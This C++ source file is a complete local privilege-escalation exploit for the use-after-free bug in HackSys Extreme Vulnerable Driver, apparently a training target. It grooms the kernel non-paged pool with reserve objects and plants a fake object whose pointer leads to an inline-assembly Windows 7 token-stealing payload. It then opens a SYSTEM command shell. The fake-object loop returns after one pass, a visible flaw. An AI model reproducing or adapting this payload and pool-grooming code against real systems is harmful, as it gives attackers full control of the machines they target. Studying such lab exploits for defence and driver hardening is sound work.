#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <vector>
#include <winternl.h>
#pragma warning(disable : 6387)

#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_DEVICE_NAME				L"\\\\.\\HackSysExtremeVulnerableDriver"

#define KTHREAD_OFFSET     0x124
#define EPROCESS_OFFSET    0x050
#define PID_OFFSET         0x0B4
#define FLINK_OFFSET       0x0B8
#define TOKEN_OFFSET       0x0F8
#define SYSTEM_PID         0x004

using PKTHREAD = PVOID;
using KEGETCURRENTTHREAD = PKTHREAD(NTAPI*)();
using PSGETCURRENTPROCESSID = HANDLE(NTAPI*)();
using PSINITIALSYSTEMPROCESS = PVOID(NTAPI*)();
using NTALLOCATERESERVEOBJECT = NTSTATUS(NTAPI*)(OUT PHANDLE, IN POBJECT_ATTRIBUTES, IN DWORD);

PSINITIALSYSTEMPROCESS PsInitialSystemProcess{};
PSGETCURRENTPROCESSID PsGetCurrentProcessId{};
KEGETCURRENTTHREAD KeGetCurrentThread{};

static auto NtkrnlpaBase() -> LPVOID {
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];

	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++) {
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 48);

		if (!strcmp((LPSTR)lpfileName, "ntkrnlpa.exe")) {
			return lpImageBase[i];
		}
	}
	return NULL;
}

VOID TokenStealingPayloadWin7Generic() {
	// No Need of Kernel Recovery as we are not corrupting anything
	__asm {
		pushad; Save registers state

		; Start of Token Stealing Stub
		xor eax, eax; Set ZERO
		mov eax, fs: [eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread
		; _KTHREAD is located at FS : [0x124]

		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current process _EPROCESS structure

		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
			; with SYSTEM process nt!_EPROCESS.Token
			; End of Token Stealing Stub

			popad; Restore registers state
	}
}

struct UAFObject {
	void* FunctionCall;
	char  Data[0x54];
};

class UAF {
private:
	HANDLE hHandle;
	void* kernel_base;

	std::vector<HANDLE> sequential_handles;
	std::vector<HANDLE> defragment_handles;

public:
	UAF() : hHandle{ getDeviceHandle() }, kernel_base{ nullptr } {
		sequential_handles.reserve(10000);
		defragment_handles.reserve(5000);
	}

	auto allocateUAFObject() -> void {
		DWORD lpBytesReturned = 0;
		auto ret = ::DeviceIoControl(hHandle, HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT, nullptr, 0,
			nullptr, 0, &lpBytesReturned, nullptr);

		if (ret == false)	std::printf("Failed with error code : %x.\n", GetLastError());
		return;
	}

	auto freeUAFObject() -> void {
		DWORD lpBytesReturned = 0;
		auto ret = ::DeviceIoControl(hHandle, HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT, nullptr, 0,
			nullptr, 0, &lpBytesReturned, nullptr);

		if (ret == false)	std::printf("Failed with error code : %x.\n", GetLastError());
		return;
	}

	auto useUAFObject() -> void {
		DWORD lpBytesReturned = 0;
		auto ret = ::DeviceIoControl(hHandle, HACKSYS_EVD_IOCTL_USE_UAF_OBJECT, nullptr, 0,
			nullptr, 0, &lpBytesReturned, nullptr);

		if (ret == false)	std::printf("Failed with error code : %x.\n", GetLastError());
		return;
	}

	auto sprayNonPagedPool() -> void {
		auto NtAllocateReserveObject = reinterpret_cast<NTALLOCATERESERVEOBJECT>
			(GetProcAddress(LoadLibraryA("ntdll.dll"), "NtAllocateReserveObject"));
		if (NtAllocateReserveObject == nullptr)		return;

		for (auto idx = 0; idx < 10000; idx++) {
			HANDLE handle;
			auto status = NtAllocateReserveObject(&handle, nullptr, 0x1);
			if (NT_SUCCESS(status))
				sequential_handles.push_back(handle);
		}

		for (auto idx = 0; idx < 5000; idx++) {
			HANDLE handle;
			auto status = NtAllocateReserveObject(&handle, nullptr, 0x1);
			if (NT_SUCCESS(status))
				defragment_handles.push_back(handle);
		}
	}

	auto createHolesNonPagedPool() -> void {
		for (auto idx = 0; idx < defragment_handles.size(); idx += 2) {
			if (defragment_handles.at(idx))
				::CloseHandle(defragment_handles.at(idx));
		}
	}

	auto freeObjectsNonPagedPool() -> void {
		for (auto idx = 0; idx < sequential_handles.size(); idx++) {
			if (sequential_handles.at(idx))
				::CloseHandle(sequential_handles.at(idx));
		}

		for (auto idx = 0; idx < defragment_handles.size(); idx++) {
			if (defragment_handles.at(idx))
				::CloseHandle(defragment_handles.at(idx));
		}
	}

	auto allocateFakeUAFObject() -> void {
		auto data = reinterpret_cast<UAFObject*>(std::malloc(sizeof UAFObject));
		if (data == nullptr)	return;

		memset(data->Data, 0x41, sizeof data->Data);
		data->FunctionCall = &TokenStealingPayloadWin7Generic;

		for (auto idx = 0; idx < 5000; idx++) {
			DWORD lpBytesReturned = 0;
			auto ret = ::DeviceIoControl(hHandle, HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT, data, sizeof UAFObject,
				nullptr, 0, &lpBytesReturned, nullptr);

			if (ret == false)	std::printf("Failed with error code : %x.\n", GetLastError());
			return;
		}
	}

	auto getDeviceHandle() -> HANDLE {
		auto handle = ::CreateFile(HACKSYS_EVD_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (handle == nullptr || handle == INVALID_HANDLE_VALUE) exit(-1);

		return handle;
	}

	auto createCmdShell() -> void {
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_SHOW;
		WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
		BOOL bReturn = CreateProcessW(nullptr, wzFilePath, nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr,
			nullptr, (LPSTARTUPINFOW)&si, &pi);

		if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
	}
};




int main(int argc, char* argv[]) {
	UAF uaf;

	uaf.sprayNonPagedPool();
	uaf.createHolesNonPagedPool();

	uaf.allocateUAFObject();
	uaf.freeUAFObject();

	uaf.allocateFakeUAFObject();
	uaf.freeObjectsNonPagedPool();
	uaf.useUAFObject();

	uaf.createCmdShell();

	return 0;
}
